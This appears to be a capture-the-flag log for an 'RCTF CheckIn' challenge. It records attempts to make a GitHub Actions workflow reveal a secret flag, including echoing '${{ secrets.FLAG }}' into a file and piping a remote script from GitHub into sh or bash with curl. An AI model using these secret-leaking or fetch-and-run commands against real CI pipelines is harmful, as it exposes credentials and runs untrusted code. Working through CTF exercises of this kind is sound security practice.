# CheckIn

secret.FLAG is like [0-9]{5}

submit flag like RCTF{[0-9]{5}}

if you get secret.FLAG=00000,then submit RCTF{00000}


### 记录

yml文件| 操作 | 结果 | 备注
-------|---------------------------|---------------------------|---------------------------
default| `echo "$user:$issues" >> issues` 			 |issues`:` | - 
add | `echo "flag:$flag" >> issues` | issues`flag:<space>`  | - 
add | `for i in {00000..99999};echo $i`| ![截屏2021-09-16 上午11.32.51.png](https://i.loli.net/2021/09/16/quTz2BdmneDVrLI.png) | 格式错误有空格缩进
add | `echo "secrets:${{ secrets.FLAG }}" >> issues` | build log:`echo "secrets:" >> issues` | unkown.
add | `c=$(for i in {00000..99999};echo "[$i]")&&echo $c >> issues`| build log:<code>command substitution: line 2: syntax error near unexpected token `echo'</code> | unkown.
add | `c=$(for i in {00000..99999};echo -e "[$i]")&&echo "$c" >> issues` | build log:<code>command substitution: line 2: syntax error near unexpected token `echo'</code> | unkown.
add | <code>curl -sL https://raw.githubusercontent.com/Bin4xin/bigger-than-bigger/master/CTF/MISC/count.sh %7C sh</code> | build log:`Process completed with exit code 1.` | ?
add | <code>curl -sL https://raw.githubusercontent.com/Bin4xin/bigger-than-bigger/master/CTF/MISC/count.sh %7C bash</code> | ? | ?